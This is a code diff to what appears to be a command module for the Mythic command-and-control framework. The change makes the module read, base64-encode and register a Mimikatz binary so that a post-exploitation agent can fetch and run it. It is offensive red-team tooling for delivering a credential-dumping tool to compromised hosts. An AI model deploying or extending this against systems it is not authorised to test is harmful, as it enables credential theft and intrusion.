@@ -7,6 +7,8 @@ from os import path
 import base64
 import donut
 
+MIMIKATZ_FILE_ID = ""
+
 class ExecutePEArguments(TaskArguments):
 
     def __init__(self, command_line):
@@ -40,8 +42,10 @@ class ExecutePECommand(CommandBase):
     attackmapping = ["T1547"]
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
+        global MIMIKATZ_FILE_ID
         task.args.add_arg("pipe_name", str(uuid4()))
         exePath = "/srv/ExecutePE.exe"
+        mimikatz_path = "/Mythic/agent_code/mimikatz_x64.exe"
 
         shellcode_path = "/tmp/loader.bin"
 
@@ -72,6 +76,22 @@ class ExecutePECommand(CommandBase):
                                                 delete_after_fetch=True)
             if file_resp.status == MythicStatus.Success:
                 task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
+                if task.args.get_arg("pe_name") == "mimikatz.exe":
+                    if MIMIKATZ_FILE_ID != "":
+                        self.add_arg("mimipe", MIMIKATZ_FILE_ID)
+                    else:
+                        with open(mimikatz_path, "rb") as f:
+                            mimibytes = f.read()
+                        b64mimi = base64.b64encode(mimibytes).decode()
+                        file_resp = await MythicRPC().execute("create_file",
+                                    task_id=task.id,
+                                    file=b64mimi,
+                                    delete_after_fetch=False)
+                        if file_resp.status == MythicStatus.Success:
+                            task.args.add_arg("mimipe", file_resp.response["agent_file_id"])
+                            MIMIKATZ_FILE_ID = file_resp.response["agent_file_id"]
+                        else:
+                            raise Exception("Failed to register Mimikatz: " + file_resp.error)
             else:
                 raise Exception("Failed to register ExecutePE shellcode: " + file_resp.error)
 
